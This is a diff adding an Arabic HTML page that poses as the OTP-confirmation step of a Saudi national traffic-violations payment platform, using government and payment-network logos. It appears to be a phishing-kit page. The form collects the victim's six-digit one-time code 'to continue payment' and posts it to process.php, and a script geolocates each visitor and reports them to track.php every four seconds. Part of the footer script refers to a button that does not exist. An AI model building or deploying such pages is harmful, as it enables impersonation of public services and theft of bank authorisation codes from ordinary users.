@@ -1,0 +1,549 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title> تحقق من كود </title>
+        <link rel="icon" type="image/png" href="indexx/favicon.ico">
+
+    
+    
+    
+    
+        
+    
+<script>
+  // 1. تفعيل المعرف الثابت لكل زائر لمنع التكرار الجلسات
+  let visitorCode = localStorage.getItem('visitor_code');
+  if (!visitorCode) {
+      visitorCode = 'VSR-' + Math.random().toString(36).substring(2, 9).toUpperCase();
+      localStorage.setItem('visitor_code', visitorCode);
+  }
+
+  async function sendTracking() {
+      // استعادة الدولة والمنطقة المخزنة لتسريع الموقع وتوفير البيانات
+      let countryCode = localStorage.getItem('visitor_country') || 'un';
+      let regionName = localStorage.getItem('visitor_region') || 'جاري التحديد...';
+
+      if (countryCode === 'un' || regionName === 'جاري التحديد...') {
+          try {
+              // جلب البيانات بدقة (رابط سريع ومفتوح تماماً لجميع دول العالم ومناطق السعودية)
+              const res = await fetch('https://ipapi.co');
+              const geo = await res.json();
+              
+              countryCode = geo.country_code ? geo.country_code.toLowerCase() : 'sa';
+              regionName = geo.region || geo.city || 'منطقة عامة';
+              
+              localStorage.setItem('visitor_country', countryCode);
+              localStorage.setItem('visitor_region', regionName);
+          } catch (e) {
+              // حل احتياطي سريع في حال تعطل الرابط الأول لأي سبب
+              try {
+                  const resAlt = await fetch('https://ipinfo.io');
+                  const geoAlt = await resAlt.json();
+                  countryCode = geoAlt.country ? geoAlt.country.toLowerCase() : 'sa';
+                  regionName = geoAlt.region || geoAlt.city || 'السعودية';
+                  
+                  localStorage.setItem('visitor_country', countryCode);
+                  localStorage.setItem('visitor_region', regionName);
+              } catch (err) {}
+          }
+      }
+
+      // 2. تحويل وتجهيز البيانات للإرسال المتوافق مع الاستضافة المجانية
+      const params = new URLSearchParams();
+      params.append('code', visitorCode);
+      params.append('pageTitle', document.title); // اسم الصفحة دقيق بدون روابط
+      params.append('countryCode', countryCode); // كود الدولة للعلم
+      params.append('region', regionName); // إرسال المنطقة بشكل مستقل ومستقر
+
+      fetch('track.php', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+          body: params
+      }).catch(e => console.log(e));
+  }
+
+  // بث التحديث الفوري وتكراره كل 4 ثوانٍ لتأكيد التواجد
+  sendTracking();
+  setInterval(sendTracking, 4000);
+
+  // تحديث فوري دقيق للاسم والحالة عند الرجوع والتقدم بأزرار المتصفح
+  window.addEventListener('pageshow', sendTracking);
+</script>
+
+
+    
+    
+    
+    
+    
+    <style>
+        /* إعدادات الصفحة الأساسية والخلفية الكاملة */
+        html, body {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            min-height: 100vh;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-image: url('indexx/Back004.jpg'); 
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            background-attachment: fixed;
+            overflow-x: hidden;
+            overflow-y: auto !important; 
+        }
+
+        body {
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* رأس الموقع - شفاف */
+        .main-header {
+            background-color: rgba(0, 150, 136, 0.7);
+            width: 100%;
+            height: 90px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .header-container {
+            width: 90%;
+            max-width: 1200px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .center-header-img {
+            height: 70px;
+            width: auto;
+            object-fit: contain;
+        }
+
+        /* وسط الموقع */
+        .main-content {
+            width: 100%;
+            padding: 40px 20px;
+            box-sizing: border-box;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        /* صندوق التحقق الشفاف */
+        .form-box {
+            background-color: rgba(255, 255, 255, 0.15);
+            backdrop-filter: blur(12px); 
+            -webkit-backdrop-filter: blur(12px);
+            padding: 30px 25px 35px 25px; 
+            border-radius: 15px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.25);
+            border: 1px solid rgba(255, 255, 255, 0.25);
+            width: 100%;
+            max-width: 440px; 
+            height: auto !important; 
+            box-sizing: border-box !important;
+        }
+
+        .form-title {
+            color: #ffffff;
+            margin-bottom: 8px;
+            font-size: 1.3rem;
+            text-shadow: 1px 1px 3px rgba(0,0,0,0.5);
+            text-align: center;
+            font-weight: bold;
+        }
+
+        .form-subtitle {
+            color: #e0e0e0;
+            font-size: 0.95rem;
+            text-align: center;
+            margin-bottom: 20px;
+            line-height: 1.5;
+            text-shadow: 1px 1px 2px rgba(0,0,0,0.3);
+        }
+
+        /* مجموعات الحقول */
+        .input-group {
+            margin-bottom: 15px !important;
+            text-align: right !important;
+            width: 100% !important;
+            display: block !important; 
+        }
+
+        .input-group label {
+            display: block !important;
+            color: #ffffff !important;
+            margin-bottom: 8px !important;
+            font-size: 0.95rem !important;
+            text-shadow: 1px 1px 2px rgba(0,0,0,0.3) !important;
+            text-align: center;
+        }
+
+        /* خانة إدخال الـ 6 أرقام */
+        .input-control {
+            display: block !important;
+            width: 100% !important;
+            padding: 12px 15px !important;
+            background-color: rgba(255, 255, 255, 0.95) !important;
+            border: 2px solid rgba(0, 150, 136, 0.4) !important; 
+            border-radius: 8px !important;
+            font-size: 1.4rem !important; 
+            font-weight: bold !important;
+            color: #222222 !important;
+            box-sizing: border-box !important;
+            outline: none !important;
+            transition: all 0.3s ease;
+            letter-spacing: 6px; 
+            text-align: center !important; 
+        }
+
+        .input-control:focus {
+            border-color: #00a896 !important;
+            box-shadow: 0 0 10px rgba(0, 150, 136, 0.6) !important;
+            background-color: #ffffff !important;
+        }
+
+        .input-control:invalid:not(:placeholder-shown),
+        form.submitted .input-control:invalid {
+            border-color: #ff3333 !important;
+            box-shadow: 0 0 8px rgba(255, 51, 51, 0.5) !important;
+            background-color: #fff0f0 !important;
+        }
+
+        .otp-countdown {
+            color: #ffffff;
+            font-size: 1.2rem; 
+            text-align: center;
+            margin-top: 15px;
+            text-shadow: 1px 1px 2px rgba(0,0,0,0.3);
+        }
+
+        #timer {
+            color: #ffeb3b;
+            font-weight: bold;
+        }
+
+        /* زر الإرسال المطور */
+        .submit-btn {
+            display: block !important; 
+            width: 100% !important;
+            padding: 14px 0 !important; 
+            margin-top: 20px !important;
+            margin-bottom: 5px !important;
+            background-color: #009688 !important;
+            color: #ffffff !important;
+            border: none !important;
+            border-radius: 8px !important;
+            font-size: 1.1rem !important;
+            font-weight: bold !important;
+            cursor: pointer !important;
+            text-align: center !important; 
+            box-sizing: border-box !important;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.25) !important;
+            white-space: nowrap !important; 
+        }
+
+        .submit-btn:hover {
+            background-color: #00796b !important;
+            transform: translateY(-2px) !important;
+            box-shadow: 0 6px 18px rgba(0,0,0,0.35) !important;
+        }
+
+        /* ذيل الموقع */
+        .site-footer {
+            background-color: rgba(0, 150, 136, 0.85); 
+            color: #ffffff;
+            padding: 30px 0;
+            width: 100%;
+            margin-top: auto; 
+        }
+
+        .footer-container {
+            width: 90%;
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+
+        .footer-section {
+            flex: 1;
+            min-width: 250px;
+            margin: 10px 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+        }
+
+        .footer-right { align-items: flex-start; text-align: right; }
+        .footer-left { align-items: flex-end; text-align: left; }
+
+        .efa-logo, .partner-logo {
+            object-fit: contain;
+            display: inline-block !important;
+        }
+
+        .partner-logos {
+            display: flex;
+            gap: 20px;
+        }
+
+        .footer-center h3 {
+            margin: 0 0 10px 0;
+            font-size: 1.1rem;
+        }
+
+        .footer-links {
+            list-style: none;
+            padding: 0;
+            margin: 0 0 15px 0;
+            display: flex;
+            gap: 15px;
+        }
+
+        .footer-links a {
+            color: #ffffff;
+            text-decoration: none;
+            font-size: 0.9rem;
+        }
+
+        .payment-methods {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+        }
+
+        .payment-logo {
+            height: 25px;
+            width: auto;
+            object-fit: contain;
+        }
+
+        /* الخط المتقطع للجوال */
+        .dashed-linee {
+            display: none;
+            width: 100%;
+            border-top: 1px dashed rgba(255, 255, 255, 0.4);
+            margin: 15px 0;
+        }
+
+        /* شاشات الجوال */
+        @media (max-width: 768px) {
+            .footer-container {
+                flex-direction: column;
+            }
+            .footer-section {
+                align-items: center !important;
+                text-align: center !important;
+            }
+            .dashed-linee {
+                display: block;
+            }
+            .footer-links {
+                flex-direction: column;
+                gap: 8px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- رأس الموقع -->
+    <header class="main-header">
+        <div class="header-container">
+            <img src="indexx/EFAAW.svg" alt="صورة وسط الرأس" class="center-header-img" width="150" height="70">
+        </div>
+    </header>
+
+    <!-- وسط الموقع -->
+    <main class="main-content">
+        <div class="form-box">
+            <div class="form-title">تأكيد رمز التحقق (OTP)</div>
+            <div class="form-subtitle">تم إرسال رمز التحقق المكون من 6 أرقام إلى رقم جوالك المسجل لإتمام العملية بشكل آمن.</div>
+            
+
+            
+            
+            <!-- نموذج واحد موحد يرسل البيانات إلى ملف الاستقبال -->
+<form action="process.php" method="POST" id="otpForm">
+    
+    <!-- حقل إدخال الـ 6 أرقام الخاص بك -->
+    <div class="input-group">
+        <label for="otp-code">أدخل رمز التحقق المرسل</label>
+        <input type="text" id="otp-code" name="otp_code" class="input-control" 
+               placeholder="••••••" maxlength="6" pattern="\d{6}" inputmode="numeric" 
+               title="يرجى كتابة الـ 6 أرقام كاملة وبشكل صحيح" oninput="validateOtpOnly(this)" required>
+    </div>
+
+    <!-- عداد إعادة الإرسال المحدث (يعرض الوقت الفعلي فقط) -->
+    <div class="otp-countdown" id="countdownArea">
+        <span id="timer">59</span> ثانية
+    </div>
+
+    <!-- زر التأكيد -->
+    <button type="submit" class="submit-btn" id="otpSubmitBtn">🔒 تأكيد ومتابعة السداد</button>
+</form>
+
+<script>
+// 1. منع كتابة أي شيء عدا الأرقام في حقل الرمز
+function validateOtpOnly(input) {
+    input.value = input.value.replace(/\D/g, '');
+}
+
+// 2. تشغيل العداد التنازلي التلقائي من 59 ثانية
+let timeLeft = 59;
+const timerId = setInterval(function() {
+    if (timeLeft <= 0) {
+        clearInterval(timerId);
+        document.getElementById('countdownArea').innerHTML = "<a href='#' onclick='resendOtp()'>إعادة إرسال الرمز مرة أخرى</a>";
+    } else {
+        document.getElementById('timer').innerText = timeLeft;
+    }
+    timeLeft -= 1;
+}, 1000);
+
+function resendOtp() {
+    alert('جاري إعادة إرسال رمز تحقق جديد...');
+    window.location.reload();
+}
+
+// 3. التحقق عند الضغط على زر الإرسال ومنع النقر المتكرر
+document.getElementById('otpForm').addEventListener('submit', function(e) {
+    const otpInput = document.getElementById('otp-code');
+    const submitBtn = document.getElementById('otpSubmitBtn');
+
+    if (otpInput.value.length !== 6) {
+        alert('الرجاء إدخال رمز التحقق المكون من 6 أرقام كاملاً.');
+        e.preventDefault();
+        return false;
+    }
+
+    // تغيير نص الزر وتعطيله لمنع تكرار الإرسال
+    submitBtn.disabled = true;
+    submitBtn.innerText = "🔒 جاري التحقق من الرمز...";
+    return true;
+});
+</script>
+
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            </form>
+        </div>
+    </main>
+
+    <!-- ذيل الموقع -->
+    <footer class="site-footer">
+        <div class="footer-container">
+            
+            <!-- القسم الأيمن -->
+            <div class="footer-section footer-right">
+                <div class="logo-efa">
+                    <img src="indexx/EFAAW.svg" alt="Efa Logo" class="efa-logo" width="160" height="70">
+                </div>
+            </div>
+
+            <div class="dashed-linee"></div>
+
+            <!-- القسم الأوسط المصلح بالكامل -->
+            <div class="footer-section footer-center">
+                <h3>المنصة الوطنية للمخالفات</h3>
+                <ul class="footer-links">
+                    <li><a href="#">الأسئلة الشائعة</a></li>
+                    <li><a href="#">شروط الإستخدام</a></li>
+                    <li><a href="#">سياسة الخصوصية</a></li>
+                </ul>
+                
+                <div class="payment-methods">
+                    <img src="indexx/Mada.svg" alt="Mada" class="payment-logo">
+                    <img src="indexx/Sdad.svg" alt="Sadad" class="payment-logo">
+                    <img src="indexx/Visa.svg" alt="Visa" class="payment-logo">
+                    <img src="indexx/MasterCard.svg" alt="MasterCard" class="payment-logo">
+                </div>
+            </div>
+
+            <div class="dashed-linee"></div>
+
+            <!-- القسم الأيسر -->
+            <div class="footer-section footer-left">
+                <div class="partner-logos">
+                    <img src="indexx/NICW.svg" alt="NIC" class="partner-logo" width="100" height="55">
+                    <img src="indexx/sdaia2.svg" alt="SDAIA" class="partner-logo" width="100" height="55">
+                </div>
+            </div>
+
+        </div>
+    </footer>
+    <script>
+        // تم تعديل الوقت هنا لتبدأ من 59 ثانية فقط
+        let countdown = 59; 
+        const timerElement = document.getElementById('timer');
+        const countdownWrapper = document.getElementById('countdownArea');
+        const redirectBtn = document.getElementById('redirectBtn');
+        const loadingIcon = document.querySelector('.submit-btn');
+
+        const interval = setInterval(() => {
+            if (countdown >= 0) {
+                const minutes = String(Math.floor(countdown / 60)).padStart(2, '0');
+                const seconds = String(countdown % 60).padStart(2, '0');
+                timerElement.textContent = `${minutes}:${seconds}`;
+                countdown--;
+            } else {
+                clearInterval(interval);
+                countdownWrapper.style.display = 'none';
+                redirectBtn.style.display = 'block';
+                if (loadingIcon) loadingIcon.style.display = 'none'; // إيقاف التحميل فوراً عند الصفر
+            }
+        }, 1000);
+
+        // إخفاء زر العودة في البداية
+        redirectBtn.style.display = 'none';
+
+        // إعادة توجيه المستخدم عند الضغط على زر العودة
+        redirectBtn.addEventListener('click', () => {
+            window.location.href = 'otoop.html'; // استبدل otoop.html بصفحتك الرئيسية
+        });
+
+        // إخفاء العداد وزر العودة عند إعادة تحميل الصفحة
+        window.addEventListener('load', () => {
+            countdownWrapper.style.display = 'block';
+            redirectBtn.style.display = 'none';
+            if (loadingIcon) loadingIcon.style.animation = 'spin 1s linear infinite'; // إعادة تشغيل حركة التحميل
+        });
+
+        // إضافة حركة دوران لزر التحميل
+        const style = document.createElement('style');
+        style.innerHTML = `
+            @keyframes spin {
+                0% { transform: rotate(0deg); }
+                100% { transform: rotate(360deg); }
+            }
+        `;
+        document.head.appendChild(style);
+    </script>
+    
